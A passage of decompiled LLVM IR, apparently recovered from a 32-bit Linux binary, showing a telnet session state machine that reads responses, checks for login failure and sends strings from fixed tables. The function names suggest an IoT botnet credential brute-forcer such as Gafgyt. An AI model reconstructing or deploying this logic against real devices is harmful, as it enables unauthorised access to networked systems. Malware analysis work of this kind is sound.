  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804d72a, label %dec_label_pc_804d752, label %dec_label_pc_804d72c

dec_label_pc_804d72c:                             ; preds = %dec_label_pc_804d726
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d745 = load i32, i32* @esp, align 4
  %v2_804d745 = inttoptr i32 %v1_804d745 to i32*
  store i32 %v2_804d122, i32* %v2_804d745, align 4
  %v1_804d748 = call i32 @reset_telstate(i32 %v5_804d5f7)
  store i32 %v1_804d748, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d752:                             ; preds = %dec_label_pc_804d726
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804d76d = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804d76d, i32* %eax.global-to-local, align 4
  %v1_804d76f = add i32 %v2_804d76d, 5
  store i32 %v1_804d76f, i32* @ebx, align 4
  %v0_804d772 = load i32, i32* @esp, align 4
  %v1_804d772 = inttoptr i32 %v0_804d772 to i32*
  store i32 0, i32* %v1_804d772, align 4
  %v1_804d779 = inttoptr i32 %v5_804d5f7 to i32*
  %v2_804d779 = call i32 @__GI_time(i32* %v1_804d779)
  store i32 %v2_804d779, i32* %eax.global-to-local, align 4
  %v0_804d77e = load i32, i32* @ebx, align 4
  %v7_804d77e = icmp ult i32 %v0_804d77e, %v2_804d779
  %v1_804d780 = icmp eq i1 %v7_804d77e, false
  br i1 %v1_804d780, label %dec_label_pc_804e0dc, label %dec_label_pc_804d786

dec_label_pc_804d786:                             ; preds = %dec_label_pc_804d752
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d79f = load i32, i32* @esp, align 4
  %v2_804d79f = inttoptr i32 %v1_804d79f to i32*
  store i32 %v2_804d122, i32* %v2_804d79f, align 4
  %v0_804d7a2 = load i32, i32* %stack_var_-332, align 4
  %v1_804d7a2 = call i32 @reset_telstate(i32 %v0_804d7a2)
  store i32 %v1_804d7a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d7ac:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804d7c4 = add i32 %v2_804d122, 24
  store i32 %v1_804d7c4, i32* %eax.global-to-local, align 4
  %v1_804d7c7 = inttoptr i32 %v1_804d7c4 to i32*
  %v2_804d7c7 = load i32, i32* %v1_804d7c7, align 4
  store i32 %v2_804d7c7, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d7df = inttoptr i32 %v2_804d122 to i32*
  %v4_804d7df = load i32, i32* %v3_804d7df, align 4
  store i32 %v4_804d7df, i32* %edx.global-to-local, align 4
  %v0_804d7e2 = load i32, i32* @esp, align 4
  %v1_804d7e2 = add i32 %v0_804d7e2, 16
  %v2_804d7e2 = inttoptr i32 %v1_804d7e2 to i32*
  store i32 134590988, i32* %v2_804d7e2, align 4
  %v0_804d7ea = load i32, i32* @esp, align 4
  %v1_804d7ea = add i32 %v0_804d7ea, 12
  %v2_804d7ea = inttoptr i32 %v1_804d7ea to i32*
  store i32 512, i32* %v2_804d7ea, align 4
  %v0_804d7f2 = load i32, i32* @ebx, align 4
  %v1_804d7f2 = load i32, i32* @esp, align 4
  %v2_804d7f2 = add i32 %v1_804d7f2, 8
  %v3_804d7f2 = inttoptr i32 %v2_804d7f2 to i32*
  store i32 %v0_804d7f2, i32* %v3_804d7f2, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804d7f9 = load i32, i32* @esp, align 4
  %v2_804d7f9 = add i32 %v1_804d7f9, 4
  %v3_804d7f9 = inttoptr i32 %v2_804d7f9 to i32*
  store i32 %arg1, i32* %v3_804d7f9, align 4
  %v0_804d7fd = load i32, i32* %edx.global-to-local, align 4
  %v1_804d7fd = load i32, i32* @esp, align 4
  %v2_804d7fd = inttoptr i32 %v1_804d7fd to i32*
  store i32 %v0_804d7fd, i32* %v2_804d7fd, align 4
  %v1_804d800 = call i32 @read_until_response(i32 %v6_804d170)
  %v1_804d805 = icmp eq i32 %v1_804d800, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  br i1 %v1_804d805, label %dec_label_pc_804d892, label %dec_label_pc_804d80d

dec_label_pc_804d80d:                             ; preds = %dec_label_pc_804d7ac
  store i32 %v1_804d7c4, i32* %eax.global-to-local, align 4
  %v2_804d828 = load i32, i32* %v1_804d7c7, align 4
  store i32 %v2_804d828, i32* %eax.global-to-local, align 4
  %v1_804d82a = load i32, i32* @esp, align 4
  %v2_804d82a = inttoptr i32 %v1_804d82a to i32*
  store i32 %v2_804d828, i32* %v2_804d82a, align 4
  %v0_804d82d = load i32, i32* %stack_var_-332, align 4
  %v1_804d82d = call i32 @contains_fail(i32 %v0_804d82d)
  %v1_804d832 = icmp eq i32 %v1_804d82d, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804d87d = load i32, i32* @esp, align 4
  %v1_804d87d = add i32 %v0_804d87d, 4
  %v2_804d87d = inttoptr i32 %v1_804d87d to i32*
  br i1 %v1_804d832, label %dec_label_pc_804d864, label %dec_label_pc_804d836

dec_label_pc_804d836:                             ; preds = %dec_label_pc_804d80d
  store i32 0, i32* %v2_804d87d, align 4
  %v0_804d857 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d857 = load i32, i32* @esp, align 4
  %v2_804d857 = inttoptr i32 %v1_804d857 to i32*
  store i32 %v0_804d857, i32* %v2_804d857, align 4
  %v0_804d85a = load i32, i32* %stack_var_-332, align 4
  %v1_804d85a = load i32, i32* %stack_var_-328, align 4
  %v2_804d85a = inttoptr i32 %v0_804d85a to i32*
  %v3_804d85a = call i32 @advance_state(i32* %v2_804d85a, i32 %v1_804d85a)
  store i32 %v3_804d85a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d864:                             ; preds = %dec_label_pc_804d80d
  store i32 3, i32* %v2_804d87d, align 4
  %v0_804d885 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d885 = load i32, i32* @esp, align 4
  %v2_804d885 = inttoptr i32 %v1_804d885 to i32*
  store i32 %v0_804d885, i32* %v2_804d885, align 4
  %v0_804d888 = load i32, i32* %stack_var_-332, align 4
  %v1_804d888 = load i32, i32* %stack_var_-328, align 4
  %v2_804d888 = inttoptr i32 %v0_804d888 to i32*
  %v3_804d888 = call i32 @advance_state(i32* %v2_804d888, i32 %v1_804d888)
  store i32 %v3_804d888, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d892:                             ; preds = %dec_label_pc_804d7ac
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804d8ad = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804d8ad, i32* %eax.global-to-local, align 4
  %v1_804d8af = add i32 %v2_804d8ad, 7
  store i32 %v1_804d8af, i32* @ebx, align 4
  %v0_804d8b2 = load i32, i32* @esp, align 4
  %v1_804d8b2 = inttoptr i32 %v0_804d8b2 to i32*
  store i32 0, i32* %v1_804d8b2, align 4
  %v0_804d8b9 = load i32, i32* %stack_var_-332, align 4
  %v1_804d8b9 = inttoptr i32 %v0_804d8b9 to i32*
  %v2_804d8b9 = call i32 @__GI_time(i32* %v1_804d8b9)
  store i32 %v2_804d8b9, i32* %eax.global-to-local, align 4
  %v0_804d8be = load i32, i32* @ebx, align 4
  %v7_804d8be = icmp ult i32 %v0_804d8be, %v2_804d8b9
  %v1_804d8c0 = icmp eq i1 %v7_804d8be, false
  br i1 %v1_804d8c0, label %dec_label_pc_804e0dc, label %dec_label_pc_804d8c6

dec_label_pc_804d8c6:                             ; preds = %dec_label_pc_804d892
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d8df = load i32, i32* @esp, align 4
  %v2_804d8df = inttoptr i32 %v1_804d8df to i32*
  store i32 %v2_804d122, i32* %v2_804d8df, align 4
  %v0_804d8e2 = load i32, i32* %stack_var_-332, align 4
  %v1_804d8e2 = call i32 @reset_telstate(i32 %v0_804d8e2)
  store i32 %v1_804d8e2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d8ec:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d902 = add i32 %v2_804d2e8, %v2_804d120
  %v4_804d902 = inttoptr i32 %v3_804d902 to i8*
  %v5_804d902 = load i8, i8* %v4_804d902, align 2
  %v6_804d902 = zext i8 %v5_804d902 to i32
  store i32 %v6_804d902, i32* %eax.global-to-local, align 4
  %v1_804d90a = mul nuw nsw i32 %v6_804d902, 4
  %v2_804d90a = add nuw nsw i32 %v1_804d90a, 134590884
  %v3_804d90a = inttoptr i32 %v2_804d90a to i32*
  %v4_804d90a = load i32, i32* %v3_804d90a, align 4
  %v1_804d91c = and i32 %v4_804d90a, -256
  store i32 %v1_804d91c, i32* %eax.global-to-local, align 4
  %v4_804d91f = inttoptr i32 %v4_804d90a to i8*
  store i32 %v4_804d90a, i32* @edi, align 4
  %v3_804d925 = call i32 @_strlen(i8* %v4_804d91f)
  store i32 %v3_804d925, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v5_804d944 = load i8, i8* %v4_804d902, align 2
  %v6_804d944 = zext i8 %v5_804d944 to i32
  store i32 %v6_804d944, i32* %eax.global-to-local, align 4
  %v1_804d94c = mul nuw nsw i32 %v6_804d944, 4
  %v2_804d94c = add nuw nsw i32 %v1_804d94c, 134590884
  %v3_804d94c = inttoptr i32 %v2_804d94c to i32*
  %v4_804d94c = load i32, i32* %v3_804d94c, align 4
  store i32 %v4_804d94c, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d969 = inttoptr i32 %v2_804d122 to i32*
  %v4_804d969 = load i32, i32* %v3_804d969, align 4
  store i32 %v4_804d969, i32* %eax.global-to-local, align 4
  %v0_804d96c = load i32, i32* @esp, align 4
  %v1_804d96c = add i32 %v0_804d96c, 12
  %v2_804d96c = inttoptr i32 %v1_804d96c to i32*
  store i32 16384, i32* %v2_804d96c, align 4
  %v0_804d974 = load i32, i32* @esi, align 4
  %v1_804d974 = load i32, i32* @esp, align 4
  %v2_804d974 = add i32 %v1_804d974, 8
  %v3_804d974 = inttoptr i32 %v2_804d974 to i32*
  store i32 %v0_804d974, i32* %v3_804d974, align 4
  %v0_804d978 = load i32, i32* @ebx, align 4
  %v1_804d978 = load i32, i32* @esp, align 4
  %v2_804d978 = add i32 %v1_804d978, 4
  %v3_804d978 = inttoptr i32 %v2_804d978 to i32*
  store i32 %v0_804d978, i32* %v3_804d978, align 4
  %v0_804d97c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d97c = load i32, i32* @esp, align 4
  %v2_804d97c = inttoptr i32 %v1_804d97c to i32*
  store i32 %v0_804d97c, i32* %v2_804d97c, align 4
  %v4_804d97f = call i32 @__libc_send(i32 %v4_804d90a, i32 %v2_804d02b, i32 %v6_804d170, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d97f, i32* %eax.global-to-local, align 4
  %v2_804d984 = icmp slt i32 %v4_804d97f, 0
  %v1_804d986 = icmp eq i1 %v2_804d984, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804d986, label %dec_label_pc_804d9ae, label %dec_label_pc_804d988

dec_label_pc_804d988:                             ; preds = %dec_label_pc_804d8ec
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d9a1 = load i32, i32* @esp, align 4
  %v2_804d9a1 = inttoptr i32 %v1_804d9a1 to i32*
  store i32 %v2_804d122, i32* %v2_804d9a1, align 4
  %v1_804d9a4 = call i32 @reset_telstate(i32 %v4_804d90a)
  store i32 %v1_804d9a4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d9ae:                             ; preds = %dec_label_pc_804d8ec
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d9c4 = load i32, i32* %v3_804d969, align 4
  store i32 %v4_804d9c4, i32* %eax.global-to-local, align 4
  %v0_804d9c7 = load i32, i32* @esp, align 4
  %v1_804d9c7 = add i32 %v0_804d9c7, 12
  %v2_804d9c7 = inttoptr i32 %v1_804d9c7 to i32*
  store i32 16384, i32* %v2_804d9c7, align 4
  %v0_804d9cf = load i32, i32* @esp, align 4
  %v1_804d9cf = add i32 %v0_804d9cf, 8
  %v2_804d9cf = inttoptr i32 %v1_804d9cf to i32*
  store i32 2, i32* %v2_804d9cf, align 4
  %v0_804d9d7 = load i32, i32* @esp, align 4
  %v1_804d9d7 = add i32 %v0_804d9d7, 4
  %v2_804d9d7 = inttoptr i32 %v1_804d9d7 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8058e96.251 to i32), i32* %v2_804d9d7, align 4
  %v0_804d9df = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9df = load i32, i32* @esp, align 4
  %v2_804d9df = inttoptr i32 %v1_804d9df to i32*
  store i32 %v0_804d9df, i32* %v2_804d9df, align 4
  %v4_804d9e2 = call i32 @__libc_send(i32 %v4_804d90a, i32 %v2_804d02b, i32 %v6_804d170, i32 ptrtoint (i32* @0 to i32))
  %v2_804d9e7 = icmp slt i32 %v4_804d9e2, 0
  %v1_804d9e9 = icmp eq i1 %v2_804d9e7, false
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804da2a = load i32, i32* @esp, align 4
  br i1 %v1_804d9e9, label %dec_label_pc_804da11, label %dec_label_pc_804d9eb

dec_label_pc_804d9eb:                             ; preds = %dec_label_pc_804d9ae
  %v2_804da04 = inttoptr i32 %v0_804da2a to i32*
  store i32 %v2_804d122, i32* %v2_804da04, align 4
  %v1_804da07 = call i32 @reset_telstate(i32 %v4_804d90a)
  store i32 %v1_804da07, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804da11:                             ; preds = %dec_label_pc_804d9ae
  %v1_804da2a = add i32 %v0_804da2a, 4
  %v2_804da2a = inttoptr i32 %v1_804da2a to i32*
  store i32 4, i32* %v2_804da2a, align 4
  %v0_804da32 = load i32, i32* %eax.global-to-local, align 4
  %v1_804da32 = load i32, i32* @esp, align 4
  %v2_804da32 = inttoptr i32 %v1_804da32 to i32*
  store i32 %v0_804da32, i32* %v2_804da32, align 4
  %v2_804da35 = inttoptr i32 %v4_804d90a to i32*
  %v3_804da35 = call i32 @advance_state(i32* %v2_804da35, i32 %v2_804d02b)
  store i32 %v3_804da35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804da3f:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804da57 = add i32 %v2_804d122, 24
  store i32 %v1_804da57, i32* %eax.global-to-local, align 4
  %v1_804da5a = inttoptr i32 %v1_804da57 to i32*
  %v2_804da5a = load i32, i32* %v1_804da5a, align 4
  store i32 %v2_804da5a, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804da72 = inttoptr i32 %v2_804d122 to i32*
  %v4_804da72 = load i32, i32* %v3_804da72, align 4
  store i32 %v4_804da72, i32* %edx.global-to-local, align 4
  %v0_804da75 = load i32, i32* @esp, align 4
  %v1_804da75 = add i32 %v0_804da75, 16
  %v2_804da75 = inttoptr i32 %v1_804da75 to i32*
  store i32 ptrtoint (i32* @global_var_805b20c to i32), i32* %v2_804da75, align 4
  %v0_804da7d = load i32, i32* @esp, align 4
  %v1_804da7d = add i32 %v0_804da7d, 12
  %v2_804da7d = inttoptr i32 %v1_804da7d to i32*
  store i32 512, i32* %v2_804da7d, align 4
  %v0_804da85 = load i32, i32* @ebx, align 4
  %v1_804da85 = load i32, i32* @esp, align 4
  %v2_804da85 = add i32 %v1_804da85, 8
  %v3_804da85 = inttoptr i32 %v2_804da85 to i32*
  store i32 %v0_804da85, i32* %v3_804da85, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804da8c = load i32, i32* @esp, align 4
  %v2_804da8c = add i32 %v1_804da8c, 4
  %v3_804da8c = inttoptr i32 %v2_804da8c to i32*
  store i32 %arg1, i32* %v3_804da8c, align 4
  %v0_804da90 = load i32, i32* %edx.global-to-local, align 4
  %v1_804da90 = load i32, i32* @esp, align 4
  %v2_804da90 = inttoptr i32 %v1_804da90 to i32*
  store i32 %v0_804da90, i32* %v2_804da90, align 4
  %v1_804da93 = call i32 @read_until_response(i32 %v6_804d170)
  %v1_804da98 = icmp eq i32 %v1_804da93, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  br i1 %v1_804da98, label %dec_label_pc_804db25, label %dec_label_pc_804daa0

dec_label_pc_804daa0:                             ; preds = %dec_label_pc_804da3f
  store i32 %v1_804da57, i32* %eax.global-to-local, align 4
  %v2_804dabb = load i32, i32* %v1_804da5a, align 4
  store i32 %v2_804dabb, i32* %eax.global-to-local, align 4
  %v1_804dabd = load i32, i32* @esp, align 4
  %v2_804dabd = inttoptr i32 %v1_804dabd to i32*
  store i32 %v2_804dabb, i32* %v2_804dabd, align 4
  %v1_804dac0 = call i32 @contains_fail(i32 %stack_var_-624.247)
  %v1_804dac5 = icmp eq i32 %v1_804dac0, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804db10 = load i32, i32* @esp, align 4
  %v1_804db10 = add i32 %v0_804db10, 4
  %v2_804db10 = inttoptr i32 %v1_804db10 to i32*
  br i1 %v1_804dac5, label %dec_label_pc_804daf7, label %dec_label_pc_804dac9

dec_label_pc_804dac9:                             ; preds = %dec_label_pc_804daa0
  store i32 0, i32* %v2_804db10, align 4
  %v0_804daea = load i32, i32* %eax.global-to-local, align 4
  %v1_804daea = load i32, i32* @esp, align 4
  %v2_804daea = inttoptr i32 %v1_804daea to i32*
  store i32 %v0_804daea, i32* %v2_804daea, align 4
  %v2_804daed = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804daed = call i32 @advance_state(i32* %v2_804daed, i32 %v2_804d02b)
  store i32 %v3_804daed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804daf7:                             ; preds = %dec_label_pc_804daa0
  store i32 5, i32* %v2_804db10, align 4
  %v0_804db18 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db18 = load i32, i32* @esp, align 4
  %v2_804db18 = inttoptr i32 %v1_804db18 to i32*
  store i32 %v0_804db18, i32* %v2_804db18, align 4
  %v2_804db1b = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804db1b = call i32 @advance_state(i32* %v2_804db1b, i32 %v2_804d02b)
  store i32 %v3_804db1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804db25:                             ; preds = %dec_label_pc_804da3f
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804db40 = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804db40, i32* %eax.global-to-local, align 4
  %v1_804db42 = add i32 %v2_804db40, 3
  store i32 %v1_804db42, i32* @ebx, align 4
  %v0_804db45 = load i32, i32* @esp, align 4
  %v1_804db45 = inttoptr i32 %v0_804db45 to i32*
  store i32 0, i32* %v1_804db45, align 4
  %v1_804db4c = inttoptr i32 %stack_var_-624.247 to i32*
  %v2_804db4c = call i32 @__GI_time(i32* %v1_804db4c)
  store i32 %v2_804db4c, i32* %eax.global-to-local, align 4
  %v0_804db51 = load i32, i32* @ebx, align 4
  %v7_804db51 = icmp ult i32 %v0_804db51, %v2_804db4c
  %v1_804db53 = icmp eq i1 %v7_804db51, false
  br i1 %v1_804db53, label %dec_label_pc_804e0dc, label %dec_label_pc_804db59

dec_label_pc_804db59:                             ; preds = %dec_label_pc_804db25
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804db72 = load i32, i32* @esp, align 4
  %v2_804db72 = inttoptr i32 %v1_804db72 to i32*
  store i32 %v2_804d122, i32* %v2_804db72, align 4
  %v1_804db75 = call i32 @reset_telstate(i32 %stack_var_-624.247)
  store i32 %v1_804db75, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804db7f:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804db95 = add i32 %v2_804d2a1, %v2_804d120
  %v4_804db95 = inttoptr i32 %v3_804db95 to i8*
  %v5_804db95 = load i8, i8* %v4_804db95, align 1
  %v6_804db95 = zext i8 %v5_804db95 to i32
  store i32 %v6_804db95, i32* %eax.global-to-local, align 4
  %v1_804db9d = mul nuw nsw i32 %v6_804db95, 4
  %v2_804db9d = add nuw nsw i32 %v1_804db9d, 134590900
  %v3_804db9d = inttoptr i32 %v2_804db9d to i32*
  %v4_804db9d = load i32, i32* %v3_804db9d, align 4
  %v1_804dbaf = and i32 %v4_804db9d, -256
  store i32 %v1_804dbaf, i32* %eax.global-to-local, align 4
  %v4_804dbb2 = inttoptr i32 %v4_804db9d to i8*
  store i32 %v4_804db9d, i32* @edi, align 4
  %v3_804dbb8 = call i32 @_strlen(i8* %v4_804dbb2)
  store i32 %v3_804dbb8, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v5_804dbd7 = load i8, i8* %v4_804db95, align 1
  %v6_804dbd7 = zext i8 %v5_804dbd7 to i32
  store i32 %v6_804dbd7, i32* %eax.global-to-local, align 4
  %v1_804dbdf = mul nuw nsw i32 %v6_804dbd7, 4
  %v2_804dbdf = add nuw nsw i32 %v1_804dbdf, 134590900
  %v3_804dbdf = inttoptr i32 %v2_804dbdf to i32*
  %v4_804dbdf = load i32, i32* %v3_804dbdf, align 4
  store i32 %v4_804dbdf, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804dbfc = inttoptr i32 %v2_804d122 to i32*
  %v4_804dbfc = load i32, i32* %v3_804dbfc, align 4
  store i32 %v4_804dbfc, i32* %eax.global-to-local, align 4
  %v0_804dbff = load i32, i32* @esp, align 4
  %v1_804dbff = add i32 %v0_804dbff, 12
  %v2_804dbff = inttoptr i32 %v1_804dbff to i32*
  store i32 16384, i32* %v2_804dbff, align 4
  %v0_804dc07 = load i32, i32* @esi, align 4
  %v1_804dc07 = load i32, i32* @esp, align 4
  %v2_804dc07 = add i32 %v1_804dc07, 8
  %v3_804dc07 = inttoptr i32 %v2_804dc07 to i32*
  store i32 %v0_804dc07, i32* %v3_804dc07, align 4
  %v0_804dc0b = load i32, i32* @ebx, align 4
  %v1_804dc0b = load i32, i32* @esp, align 4
  %v2_804dc0b = add i32 %v1_804dc0b, 4
  %v3_804dc0b = inttoptr i32 %v2_804dc0b to i32*
  store i32 %v0_804dc0b, i32* %v3_804dc0b, align 4
  %v0_804dc0f = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc0f = load i32, i32* @esp, align 4
  %v2_804dc0f = inttoptr i32 %v1_804dc0f to i32*
  store i32 %v0_804dc0f, i32* %v2_804dc0f, align 4
  %v4_804dc12 = call i32 @__libc_send(i32 %v4_804db9d, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  store i32 %v4_804dc12, i32* %eax.global-to-local, align 4
  %v2_804dc17 = icmp slt i32 %v4_804dc12, 0
  %v1_804dc19 = icmp eq i1 %v2_804dc17, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804dc19, label %dec_label_pc_804dc41, label %dec_label_pc_804dc1b

dec_label_pc_804dc1b:                             ; preds = %dec_label_pc_804db7f
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804dc34 = load i32, i32* @esp, align 4
  %v2_804dc34 = inttoptr i32 %v1_804dc34 to i32*
  store i32 %v2_804d122, i32* %v2_804dc34, align 4
  %v1_804dc37 = call i32 @reset_telstate(i32 %v4_804db9d)
  store i32 %v1_804dc37, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804dc41:                             ; preds = %dec_label_pc_804db7f
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804dc57 = load i32, i32* %v3_804dbfc, align 4
  store i32 %v4_804dc57, i32* %eax.global-to-local, align 4
  %v0_804dc5a = load i32, i32* @esp, align 4
  %v1_804dc5a = add i32 %v0_804dc5a, 12
  %v2_804dc5a = inttoptr i32 %v1_804dc5a to i32*
  store i32 16384, i32* %v2_804dc5a, align 4
  %v0_804dc62 = load i32, i32* @esp, align 4
  %v1_804dc62 = add i32 %v0_804dc62, 8
  %v2_804dc62 = inttoptr i32 %v1_804dc62 to i32*
  store i32 2, i32* %v2_804dc62, align 4
  %v0_804dc6a = load i32, i32* @esp, align 4
  %v1_804dc6a = add i32 %v0_804dc6a, 4
  %v2_804dc6a = inttoptr i32 %v1_804dc6a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8058e96.251 to i32), i32* %v2_804dc6a, align 4
  %v0_804dc72 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc72 = load i32, i32* @esp, align 4
  %v2_804dc72 = inttoptr i32 %v1_804dc72 to i32*
  store i32 %v0_804dc72, i32* %v2_804dc72, align 4
  %v4_804dc75 = call i32 @__libc_send(i32 %v4_804db9d, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  %v2_804dc7a = icmp slt i32 %v4_804dc75, 0
  %v1_804dc7c = icmp eq i1 %v2_804dc7a, false
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804dcbd = load i32, i32* @esp, align 4
  br i1 %v1_804dc7c, label %dec_label_pc_804dca4, label %dec_label_pc_804dc7e

dec_label_pc_804dc7e:                             ; preds = %dec_label_pc_804dc41
  %v2_804dc97 = inttoptr i32 %v0_804dcbd to i32*
  store i32 %v2_804d122, i32* %v2_804dc97, align 4
  %v1_804dc9a = call i32 @reset_telstate(i32 %v4_804db9d)
  store i32 %v1_804dc9a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804dca4:                             ; preds = %dec_label_pc_804dc41
  %v1_804dcbd = add i32 %v0_804dcbd, 4
  %v2_804dcbd = inttoptr i32 %v1_804dcbd to i32*
  store i32 6, i32* %v2_804dcbd, align 4
  %v0_804dcc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dcc5 = load i32, i32* @esp, align 4
  %v2_804dcc5 = inttoptr i32 %v1_804dcc5 to i32*
  store i32 %v0_804dcc5, i32* %v2_804dcc5, align 4
  %v2_804dcc8 = inttoptr i32 %v4_804db9d to i32*
  %v3_804dcc8 = call i32 @advance_state(i32* %v2_804dcc8, i32 %stack_var_-624.247)
  store i32 %v3_804dcc8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804dcd2:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804dcea = add i32 %v2_804d122, 24
  store i32 %v1_804dcea, i32* %eax.global-to-local, align 4
  %v1_804dced = inttoptr i32 %v1_804dcea to i32*
  %v2_804dced = load i32, i32* %v1_804dced, align 4
  store i32 %v2_804dced, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804dd05 = inttoptr i32 %v2_804d122 to i32*
  %v4_804dd05 = load i32, i32* %v3_804dd05, align 4
  store i32 %v4_804dd05, i32* %edx.global-to-local, align 4
  %v0_804dd08 = load i32, i32* @esp, align 4
  %v1_804dd08 = add i32 %v0_804dd08, 16
  %v2_804dd08 = inttoptr i32 %v1_804dd08 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805b260.252 to i32), i32* %v2_804dd08, align 4
  %v0_804dd10 = load i32, i32* @esp, align 4
  %v1_804dd10 = add i32 %v0_804dd10, 12
  %v2_804dd10 = inttoptr i32 %v1_804dd10 to i32*
  store i32 512, i32* %v2_804dd10, align 4
  %v0_804dd18 = load i32, i32* @ebx, align 4
  %v1_804dd18 = load i32, i32* @esp, align 4
  %v2_804dd18 = add i32 %v1_804dd18, 8
  %v3_804dd18 = inttoptr i32 %v2_804dd18 to i32*
  store i32 %v0_804dd18, i32* %v3_804dd18, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804dd1f = load i32, i32* @esp, align 4
  %v2_804dd1f = add i32 %v1_804dd1f, 4
  %v3_804dd1f = inttoptr i32 %v2_804dd1f to i32*
  store i32 %arg1, i32* %v3_804dd1f, align 4
  %v0_804dd23 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dd23 = load i32, i32* @esp, align 4
  %v2_804dd23 = inttoptr i32 %v1_804dd23 to i32*
